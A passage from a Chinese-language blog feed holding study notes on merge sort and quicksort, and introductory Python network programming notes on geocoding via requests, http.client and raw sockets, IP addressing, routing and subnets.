<h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><h3 id="算法思想-2"><a href="#算法思想-2" class="headerlink" title="算法思想"></a>算法思想</h3><h4 id="归并两个排好序的序列：给了两个已经排好序的子序列，将其合并成一个排好序的序列。"><a href="#归并两个排好序的序列：给了两个已经排好序的子序列，将其合并成一个排好序的序列。" class="headerlink" title="归并两个排好序的序列：给了两个已经排好序的子序列，将其合并成一个排好序的序列。"></a>归并两个排好序的序列：给了两个已经排好序的子序列，将其合并成一个排好序的序列。</h4><p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170422/231952503.png" alt="mark"><br>1.将原数组的所有内容复制到另一个数组中<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k=lo;k&lt;hi;k++)</div><div class="line">    aux[k]=a[k];<span class="comment">//将a[lo...hi]复制到aux[lo...hi]</span></div></pre></td></tr></table></figure></p>
<p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170422/232456433.png" alt="mark"><br>2.将其拷贝回原来的数组</p>
<ul>
<li>设置i,j,k分别指向aux的左边子数组，aux的右边子数组和原数组a的首部<br><code>int i=lo,j=mid+1;</code><br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170422/232839627.png" alt="mark"></li>
<li>比较aux[i]和aux[j]的大小，取其中小的放入放入原数组中，原本的指针递增。重复上述过程。<br>  <strong>注意四个判断</strong><br>  1.左半边元素用尽，取右半边<br>  2.右半边元素用尽，取左半边<br>  3.右半边当前元素小于左半边当前元素<br>  4.右半边当前元素大于等于左半边当前元素  </li>
</ul>
<h4 id="归并的算法实现"><a href="#归并的算法实现" class="headerlink" title="归并的算法实现"></a>归并的算法实现</h4><p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170422/233820035.png" alt="mark"></p>
<h4 id="在归并的代码基础上，递归实现排序"><a href="#在归并的代码基础上，递归实现排序" class="headerlink" title="在归并的代码基础上，递归实现排序"></a>在归并的代码基础上，递归实现排序</h4><ol>
<li>在递归调用前先检查下标<br><code>if(hi&lt;=lo)    return;</code></li>
<li>计算中间值mid，先排序前半部分，再排序后半部分，然后归并。<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> mid=(lo+hi)/<span class="number">2</span>;</div><div class="line">sort(a,aux,lo,mid);</div><div class="line">sort(a,aux,mid+<span class="number">1</span>,hi);</div><div class="line">merge(a,aux,lo,mid,hi);</div></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="完整的算法实现"><a href="#完整的算法实现" class="headerlink" title="完整的算法实现"></a>完整的算法实现</h4><p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170422/234810914.png" alt="mark"><br><strong> 这里要注意，不要将创建辅助数组的任务在递归的sort()中创建，因为那会多出分配许多额外的小数组的花费。这会严重影响归并的效率！</strong><br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170422/235307662.png" alt="mark"></p>
<h3 id="效率分析-2"><a href="#效率分析-2" class="headerlink" title="效率分析"></a>效率分析</h3><p>归并排序需要至多NlogN次比较和6NlogN次数组访问  </p>
<ul>
<li>比较的次数<br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170422/235932537.png" alt="mark"><br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/000353246.png" alt="mark"></li>
<li>归并算法使用随着N的增大而增大的额外空间</li>
</ul>
<h3 id="自底向上的归并"><a href="#自底向上的归并" class="headerlink" title="自底向上的归并"></a>自底向上的归并</h3><p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/000944055.png" alt="mark"><br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/001003803.png" alt="mark"></p>
<h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/002609693.png" alt="mark"></p>
<h3 id="算法思想-3"><a href="#算法思想-3" class="headerlink" title="算法思想"></a>算法思想</h3><p>设置最左边元素索引为lo,最右边为hi，设置i=lo+1，j=hi</p>
<ol>
<li>从左到右扫描，如果a[i] &lt; a[lo]则i右移</li>
<li>从右向左扫描，如果a[j] &gt; a[lo]则j左移</li>
<li>当a[i]&gt;=a[lo]且a[j]&lt;=a[lo]时，交换a[i]和a[j]的值</li>
<li>不断重复上述过程，直到i和j相遇。</li>
<li>相遇之后，交换a[lo]和a[j]的值，从而使得j左边的元素都比a[j]小，右边的元素都比a[j]大<br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/003209570.png" alt="mark"><br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/003315470.png" alt="mark"><br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/003337523.png" alt="mark"><br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/003413440.png" alt="mark"><br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/003607930.png" alt="mark"></li>
<li>将原数组分成j左边和j右边两部分，递归上述过程实现排序。</li>
</ol>
<h3 id="算法实现-2"><a href="#算法实现-2" class="headerlink" title="算法实现"></a>算法实现</h3><p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/003651536.png" alt="mark"><br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/003759009.png" alt="mark"><br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/003903150.png" alt="mark"></p>
<h3 id="效率分析-3"><a href="#效率分析-3" class="headerlink" title="效率分析"></a>效率分析</h3><p>将长度为N的无重复数组排序，快速排序平均需要~2NlnN次比较。<br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/005230993.png" alt="mark"><br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/005243923.png" alt="mark"></p>
<h2 id="快排算法改进——三向切分"><a href="#快排算法改进——三向切分" class="headerlink" title="快排算法改进——三向切分"></a>快排算法改进——三向切分</h2><p>主要用于存在大量重复元素的数组</p>
<h3 id="算法思想-4"><a href="#算法思想-4" class="headerlink" title="算法思想"></a>算法思想</h3><ul>
<li>将a[lo]作为切分元素<br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/010412503.png" alt="mark"></li>
<li>让i从左向右扫描</li>
<li>a[i] &lt; v,将a[lt]和a[i]交换，lt和i右移</li>
<li>a[i] &gt; v,将a[gt]和a[i]交换，gt左移</li>
<li>a[i] = v,将i右移<br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/011802918.png" alt="mark"><br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/010811230.png" alt="mark"></li>
</ul>
<h3 id="算法实现-3"><a href="#算法实现-3" class="headerlink" title="算法实现"></a>算法实现</h3><p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/011043298.png" alt="mark"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;因为发现自己好像已经很久没有像样的写过算法了……慢慢的重新整理算法吧。&lt;br&gt;写成一个系列算了~（反正也是按照书的顺序简单记
    
    </summary>
    
    
      <category term="Algorithm" scheme="http://yoursite.com/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>python网络编程：客户端/服务端网络编程简介</title>
    <link href="http://yoursite.com/2017/03/25/Python_Network_Program_1/"/>
    <id>http://yoursite.com/2017/03/25/Python_Network_Program_1/</id>
    <published>2017-03-24T20:29:42.000Z</published>
    <updated>2017-03-25T09:17:04.865Z</updated>
    
    <content type="html"><![CDATA[<h2 id="客户端-服务端网络编程"><a href="#客户端-服务端网络编程" class="headerlink" title="客户端/服务端网络编程"></a>客户端/服务端网络编程</h2><h3 id="1-1-基础：协议栈与库"><a href="#1-1-基础：协议栈与库" class="headerlink" title="1.1 基础：协议栈与库"></a>1.1 基础：协议栈与库</h3><ul>
<li>协议栈（Protocol stack） 复杂的网络服务建立在简单网络服务的基础之上</li>
<li>Python库（library） 包括内置的标准库和第三方库，来解析使用的网络协议</li>
</ul>
<p>要学习的内容就是<em>了解重要的网络库，并理解这些网络库所出现的底层网络服务。</em></p>
<h3 id="1-2-一个有趣的例子"><a href="#1-2-一个有趣的例子" class="headerlink" title="1.2 一个有趣的例子"></a>1.2 一个有趣的例子</h3><p>Question: 找出’ 207 N. Defiance St , Archbold, OH ‘所对应的经度纬度。</p>
<h3 id="1-2-1-最上层的谷歌地理编码API"><a href="#1-2-1-最上层的谷歌地理编码API" class="headerlink" title="1.2.1 最上层的谷歌地理编码API"></a>1.2.1 最上层的谷歌地理编码API</h3><p><strong>使用第三方库获取经度和纬度</strong></p>
<ul>
<li>step 0:寻找一个第三方包<ol>
<li>python standard library:<a href="https://docs.python.org/3/library/" target="_blank" rel="external">https://docs.python.org/3/library/</a></li>
<li>python package index:<a href="https://pypi.python.org/pypi" target="_blank" rel="external">https://pypi.python.org/pypi</a></li>
</ol>
</li>
</ul>
<ul>
<li>step 1:下载安装一个第三方包：pygeocoder</li>
<li>step 2:运行</li>
</ul>
<p>虽然把一个有趣的网络编程问题变成一个三行的无聊脚本很让人不爽，但是90%的编程挑战就是这么解决的——在已有的解决方案的基础上构建智能又简洁的方案。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python3</span></div><div class="line"><span class="comment">#search1.py</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pygeocoder <span class="keyword">import</span> Geocoder</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    address = <span class="string">'207 N. Defiance St, Archbold, OH'</span></div><div class="line">    print(Geocoder.geocode(address)[<span class="number">0</span>].coordinates)</div></pre></td></tr></table></figure>
<h3 id="1-2-2-应用层"><a href="#1-2-2-应用层" class="headerlink" title="1.2.2 应用层"></a>1.2.2 应用层</h3><p><strong>从谷歌地理编码API获取一个JSON文档</strong></p>
<ul>
<li>step 0:如果没有一个完整封装了所需要功能的第三方库，就需要我们自己为谷歌地图API编写客户端</li>
<li>step 1:构造URL，获得查询响应</li>
<li>step 2:将结果转化为JSON</li>
</ul>
<p><strong>request库文档</strong><br><a href="http://docs.python-requests.org/en/master/" target="_blank" rel="external">http://docs.python-requests.org/en/master/</a></p>
<ol>
<li><p>使用requests发送网络请求</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="comment">#获取 Github 的公共时间线：</span></div><div class="line">r = requests.get(<span class="string">'https://github.com/timeline.json'</span>)</div></pre></td></tr></table></figure>
</li>
<li><p>传递URL参数<br>例如， httpbin.org/get?key=val。<br>使用Requests允许使用params关键字参数，以一个字典来提供查询字符串的参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">payload = &#123;<span class="string">'key1'</span>: <span class="string">'value1'</span>, <span class="string">'key2'</span>: <span class="string">'value2'</span>&#125;</div><div class="line">r = requests.get(<span class="string">"http://httpbin.org/get"</span>, params=payload)</div><div class="line">print(r.url)</div><div class="line"><span class="comment"># 输出http://httpbin.org/get?key2=value2&amp;key1=value1</span></div></pre></td></tr></table></figure>
</li>
<li><p>json解码</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">r = requests.get(<span class="string">'https://github.com/timeline.json'</span>)</div><div class="line">r.json()</div><div class="line"><span class="comment">#[&#123;u'repository': &#123;u'open_issues': 0, u'url': 'https://github.com/...</span></div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python3</span></div><div class="line"><span class="comment">#search2.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">geocode</span><span class="params">(address)</span>:</span></div><div class="line">    parameters = &#123;<span class="string">'address'</span>: address, <span class="string">'sensor'</span>: <span class="string">'false'</span>&#125;</div><div class="line">    base = <span class="string">'http://maps.googleapis.com/maps/api/geocode/json'</span></div><div class="line">    response = requests.get(base, params=parameters)</div><div class="line">    answer = response.json()</div><div class="line">    print(answer[<span class="string">'results'</span>][<span class="number">0</span>][<span class="string">'geometry'</span>][<span class="string">'location'</span>])</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    geocode(<span class="string">'207 N. Defiance St, Archbold, OH'</span>)</div></pre></td></tr></table></figure>
<h3 id="什么是URL？"><a href="#什么是URL？" class="headerlink" title="什么是URL？"></a>什么是URL？</h3><p><code>http://maps.googleapis.com/maps/api/geocode/json?address=&quot;207 N. Defiance St, Archbold, OH&quot;&amp;sensor=false</code></p>
<p><strong>协议 主机名 主机上特定文档的路径</strong></p>
<p>这里我们使用的底层协议就是著名的HTTP（Hypertext Transfer Protocol）</p>
<p>Requests库的具体原理机制其实就是由HTTP提供的</p>
<h3 id="1-2-3-直接使用http协议"><a href="#1-2-3-直接使用http协议" class="headerlink" title="1.2.3 直接使用http协议"></a>1.2.3 直接使用http协议</h3><p><strong> 使用原始http操作连接谷歌地图 </strong></p>
<ol>
<li>step 1:请求连接一台特定的主机</li>
<li>step 2:手动构造一个带path的GET查询</li>
<li>step 3:直接从http连接读取响应结果。</li>
</ol>
<h3 id="http和json"><a href="#http和json" class="headerlink" title="http和json"></a>http和json</h3><ul>
<li><p>class http.client.HTTPConnection(host, port=None, [timeout, ]source_address=None)</p>
<p>  <strong>与HTTP服务器建立连接</strong><br>  <img src="http://onc55v8te.bkt.clouddn.com/blog/20170325/072512614.png" alt="mark"></p>
<p>  例如，以下调用创建连接到同一主机和端口上的服务器的实例：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line">&gt;&gt;&gt; h1 = http.client.HTTPConnection(&apos;www.python.org&apos;)</div><div class="line">&gt;&gt;&gt; h2 = http.client.HTTPConnection(&apos;www.python.org:80&apos;)</div><div class="line">&gt;&gt;&gt; h3 = http.client.HTTPConnection(&apos;www.python.org&apos;, 80)</div><div class="line">&gt;&gt;&gt; h4 = http.client.HTTPConnection(&apos;www.python.org&apos;, 80, timeout=10)</div></pre></td></tr></table></figure>
<ul>
<li><p><code>json.loads(s, *, encoding=None, cls=None, object_hook=None, parse_float=None, parse_int=None, parse_constant=None, object_pairs_hook=None, **kw)</code></p>
<p> <strong>按照conversion table将s对象（包含JSON文档的str，bytes或bytearray实例）反序列化为Python对象。</strong></p>
<p> <img src="http://onc55v8te.bkt.clouddn.com/blog/20170325/073931487.png" alt="mark"></p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python3</span></div><div class="line"><span class="comment">#search3.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> http.client</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</div><div class="line"></div><div class="line">base = <span class="string">'/maps/api/geocode/json'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">geocode</span><span class="params">(address)</span>:</span></div><div class="line">    path = <span class="string">'&#123;&#125;?address=&#123;&#125;&amp;sensor=false'</span>.format(base, quote_plus(address))</div><div class="line">    connection = http.client.HTTPConnection(<span class="string">'maps.googleapis.com'</span>)</div><div class="line">    connection.request(<span class="string">'GET'</span>, path)</div><div class="line">    rawreply = connection.getresponse().read()</div><div class="line">    reply = json.loads(rawreply.decode(<span class="string">'utf-8'</span>))</div><div class="line">    print(reply[<span class="string">'results'</span>][<span class="number">0</span>][<span class="string">'geometry'</span>][<span class="string">'location'</span>])</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    geocode(<span class="string">'207 N. Defiance St, Archbold, OH'</span>)</div></pre></td></tr></table></figure>
<h3 id="1-2-4-更原始的网络会话"><a href="#1-2-4-更原始的网络会话" class="headerlink" title="1.2.4 更原始的网络会话"></a>1.2.4 更原始的网络会话</h3><p>HTTP是无法通过空气在机器间传输数据的，它使用了更简单的抽象来完成这些操作。</p>
<p>事实上，现代操作系统提供了使用TCP协议在IP网络的不同程序间进行纯文本网络会话的功能。</p>
<p>换句话说，HTTP协议精准描述了两台主机间通过TCP传输的信息格式，并以此提供HTTP的各项功能。</p>
<p>如果深入观察HTTP的实现细节，那么你将到达通过Python可以方便操作的网络协议栈的最底层（撒花）</p>
<p><strong> 直接使用套接字与谷歌地图通信 </strong></p>
<ul>
<li>step 1 发送字节串</li>
<li>step 2 接收字节串并打印到屏幕</li>
</ul>
<p>我们可以通过sendall()函数传入的参数来了解到我们进行查询的具体内容。<br>可以看到<strong><code>GET /maps/api/geocode/json?address={}&amp;sensor=false HTTP/1.1\r\n\</code></strong><br>查询中包括了关键字GET,后面跟着待获取文档的路径和支持的HTTP版本。<br>此外可以看到，GET信息后跟着一些请求头，每个请求头包括了名称，冒号，值，结束符（回车换行）</p>
<p><strong>这些状态和响应头就是之前程序中被我们用http库处理的底层细节。</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python3</span></div><div class="line"><span class="comment">#search4.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</div><div class="line"></div><div class="line">request_text = <span class="string">"""\</span></div><div class="line">GET /maps/api/geocode/json?address=&#123;&#125;&amp;sensor=false HTTP/1.1\r\n\</div><div class="line">Host: maps.googleapis.com:80\r\n\</div><div class="line">User-Agent: search4.py (Foundations of Python Network Programming)\r\n\</div><div class="line">Connection: close\r\n\</div><div class="line">\r\n\</div><div class="line">"""</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">geocode</span><span class="params">(address)</span>:</span></div><div class="line">    sock = socket.socket()</div><div class="line">    sock.connect((<span class="string">'maps.googleapis.com'</span>, <span class="number">80</span>))</div><div class="line">    request = request_text.format(quote_plus(address))</div><div class="line">    sock.sendall(request.encode(<span class="string">'ascii'</span>))</div><div class="line">    raw_reply = <span class="string">b''</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        more = sock.recv(<span class="number">4096</span>)</div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> more:</div><div class="line">            <span class="keyword">break</span></div><div class="line">        raw_reply += more</div><div class="line">    print(raw_reply.decode(<span class="string">'utf-8'</span>))</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    geocode(<span class="string">'207 N. Defiance St, Archbold, OH'</span>)</div></pre></td></tr></table></figure>
<h3 id="1-2-5-层层深入"><a href="#1-2-5-层层深入" class="headerlink" title="1.2.5 层层深入"></a>1.2.5 层层深入</h3><ol>
<li>可以看到，协议栈的每一层都是使用了底层协议提供的功能，并向上层提供服务。</li>
<li>Python对各网络层的支持十分全面,无论是获取特定URL标识的文档还是使用socket来接收字节串，python都提供了现成的类和函数。</li>
<li>随着通信协议越来越底层，程序的质量明显下降。search2.py和search3.py对查询的表单结构和主机名等进行了硬编码，难以维护。search4.py更是包含了一个手写的、无参数的HTTP请求。<br>这说明正确实现网络协议并非易事，应该尽可能的使用标准库或者第三方库。</li>
<li>高层的网络协议会将底层网络的细节隐藏，如果只用过pygeocoder库，将永远不知道URL和HTTP是它的底层机制。</li>
</ol>
<h3 id="1-2-6-编码和解码"><a href="#1-2-6-编码和解码" class="headerlink" title="1.2.6 编码和解码"></a>1.2.6 编码和解码</h3><p>python3做了一项尝试，永远不会自动将字节转换为字符串。因此比起Python2，Python3更多的调用decode()和encode()方法</p>
<ul>
<li>解码(decode)：在应用程序使用字节时发生，比如从网络或文件接收到字节串。</li>
<li>编码(encode): 将字符串对外输出时所实施的过程。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python3</span></div><div class="line"><span class="comment">#stringcodes.py</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="comment"># Translating from the outside world of bytes to Unicode characters.</span></div><div class="line">    input_bytes = <span class="string">b'\xff\xfe4\x001\x003\x00 \x00i\x00s\x00 \x00i\x00n\x00.\x00'</span></div><div class="line">    input_characters = input_bytes.decode(<span class="string">'utf-16'</span>)</div><div class="line">    print(repr(input_characters))</div><div class="line"></div><div class="line">    <span class="comment"># Translating characters back into bytes before sending them.</span></div><div class="line">    output_characters = <span class="string">'We copy you down, Eagle.\n'</span></div><div class="line">    output_bytes = output_characters.encode(<span class="string">'utf-8'</span>)</div><div class="line">    print(repr(output_bytes))</div><div class="line">    <span class="comment"># output</span></div><div class="line">    <span class="comment"># '413 is in.'</span></div><div class="line">    <span class="comment"># b'We copy you down, Eagle.\n'</span></div></pre></td></tr></table></figure>
<pre><code>&apos;413 is in.&apos;
b&apos;We copy you down, Eagle.\n&apos;
</code></pre><h3 id="1-2-7-IP地址"><a href="#1-2-7-IP地址" class="headerlink" title="1.2.7 IP地址"></a>1.2.7 IP地址</h3><p>一个传统的4字节IP地址如下表示：<br>130.207.244.244<br>由于纯数字不方便记忆，人们使用hostname代替IP，如我们输入google.com就可以访问谷歌，但其实它是将主机名解析成了具体的IP。<br>这个特定的网络服务叫做域名系统（DNS,Domain Name System）  </p>
<p><strong>目前只需要记住</strong></p>
<ul>
<li>实际IP协议总是由数字表示的IP来作为数据包的目的地址</li>
<li>将主机名解析为IP这一复杂的细节是由操作系统来处理的</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python3</span></div><div class="line"><span class="comment"># getname.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> socket</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    hostname = <span class="string">'maps.google.com'</span></div><div class="line">    addr = socket.gethostbyname(hostname)</div><div class="line">    print(<span class="string">'The IP address of &#123;&#125; is &#123;&#125;'</span>.format(hostname, addr))</div><div class="line">    <span class="comment">#output</span></div><div class="line">    <span class="comment">#The IP address of maps.google.com is 172.217.24.14</span></div></pre></td></tr></table></figure>
<pre><code>The IP address of maps.google.com is 172.217.24.14
</code></pre><h3 id="特殊的IP地址段"><a href="#特殊的IP地址段" class="headerlink" title="特殊的IP地址段"></a>特殊的IP地址段</h3><ul>
<li><code>127.*.*.*</code>：特殊的预留地址段<br> <strong>这一地址段由机器上运行的本地应用程序使用</strong><br> 大多数时候，我们使用127.0.0.1或者localhost表示<strong>运行该程序的机器本身</strong>。</li>
<li><code>10.*.*.*、176.16-31.*.*、192.168.*.*</code>：<strong>私有子网</strong></li>
</ul>
<h3 id="1-2-8-路由"><a href="#1-2-8-路由" class="headerlink" title="1.2.8 路由"></a>1.2.8 路由</h3><p>一旦应用程序请求操作系统向某一特定IP地址发送数据，操作系统就需要决定如何使用该机器来连接物理网络来传输数据。<br><strong>根据目的IP地址选择将数据包发往何处就叫做路由</strong></p>
<p><img src="http://onc55v8te.bkt.clouddn.com/blog/20170325/160903555.png" alt="mark"><br>在网络协议中，IP是面向非连接的，所谓的非连接就是传递数据的时候，不检测网络是否连通。所以是不可靠的数据报协议，<strong>IP协议主要负责在主机之间寻址和选择数据包路由</strong>。<br>由于python程序很少运行在骨干网路由器上，所以只需记住以下简单路由的情形。</p>
<ul>
<li>如果IP地址形如<code>127.*.*.*</code>，那么操作系统会知道数据包的目的地址是本机上运行的另一个应用程序。这个数据包甚至不会被传送给物理网络设备，而是通过操作系统内部的数据复制转交给另一应用程序。</li>
<li>如果目的IP地址与本机处于同一子网，就可以通过检查本地以太网段、无线信道，或是其他任何网络信息来找到目标主机。然后就可以将数据包发送给本地连接的机器。</li>
<li>否则，计算机将数据包转发给网关（gateway machine），它将本地子网连接至互联网，然后决定将数据包发往何处。</li>
</ul>
<h3 id="什么是子网？"><a href="#什么是子网？" class="headerlink" title="什么是子网？"></a>什么是子网？</h3><p>同一子网中所有主机有着相同的IP地址前缀。<strong>实际的路由表中，通过结合IP地址和掩码来表示子网</strong>。<br><strong>掩码指出了某主机属于某子网所需的高位比特匹配数</strong>。只需要记得IP地址的每字节代表8位二进制数，就能读懂子网的数字表示。</p>
<ol>
<li>127.0.0.0/8：描述了前面所述预留给本机的IP地址段，即地址的前8位必须与127匹配，后24位是任意值。</li>
<li>192.168.0.0/16：描述了192.168私有地址段的任何IP地址，即地址的前16位必须完全匹配，后16位可以是任意值</li>
<li>192.168.5.0/24：这里明确制定了一个特定的独立子网，是最常见的子网掩码。地址前24位（3字节）都被指定，用来匹配属于该子网的IP地址，只有最后一位不同，这就允许有256个不同的地址。</li>
<li>通常来说，<strong>.0</strong>地址代表子网名，<strong>.255</strong>则用作“广播数据包”的目的地址：所以实际上有254个地址分配给计算机。<strong>.1</strong>地址通常用于连接外网的网关，但不是绝对的。</li>
</ol>
<h3 id="1-2-9-数据包分组"><a href="#1-2-9-数据包分组" class="headerlink" title="1.2.9 数据包分组"></a>1.2.9 数据包分组</h3><p>尽管操作系统的网络栈已经巧妙的隐藏了这一复杂的细节，但是这里还是简单的提一下。<br>IP支持的数据包极大，最大可至64KB，但是构建与IP网络之上的实际网络设备通常不支持这么大的数据包，所以需要分片。<br>IP头包含一个表示“不分组”的标记（DF,Don’t Fragment）</p>
<ul>
<li>没有设置DF,允许分组并标记，接收后重组。</li>
<li>设置了DF标记，不允许分组，如果网络无法容纳数据包，将会丢弃并发挥一条错误信息，错误信息是由一种数据包表示的，叫做ICMP(Internet Control Message Protocal)</li>
</ul>
<p>Python程序无法控制DF标记，通常由操作系统决定，操作系统的逻辑一般是：<strong>UDP会话不设置DF标记，TCP会话设置DF标记（保证数据包在途中不会被不断分组，而导致会话低效）</strong></p>
<p><a href="http://www.vants.org/?post=106" target="_blank" rel="external">关于IP分片(IP Fragment)的详细内容</a><br>另外，可以参考<strong>tcp/ip卷一11.5</strong><br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170325/170750195.png" alt="mark"><br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170325/170905057.png" alt="mark"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;客户端-服务端网络编程&quot;&gt;&lt;a href=&quot;#客户端-服务端网络编程&quot; class=&quot;headerlink&quot; title=&quot;客户端/服务端网络编程&quot;&gt;&lt;/a&gt;客户端/服务端网络编程&lt;/h2&gt;&lt;h3 id=&quot;1-1-基础：协议栈与库&quot;&gt;&lt;a href=&quot;#1-1-基
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
      <category term="Network" scheme="http://yoursite.com/tags/Network/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2017/03/25/hello-world/"/>
    <id>http://yoursite.com/2017/03/25/hello-world/</id>
    <published>2017-03-24T16:36:58.071Z</published>
    <updated>2017-03-24T22:08:23.656Z</updated>
    
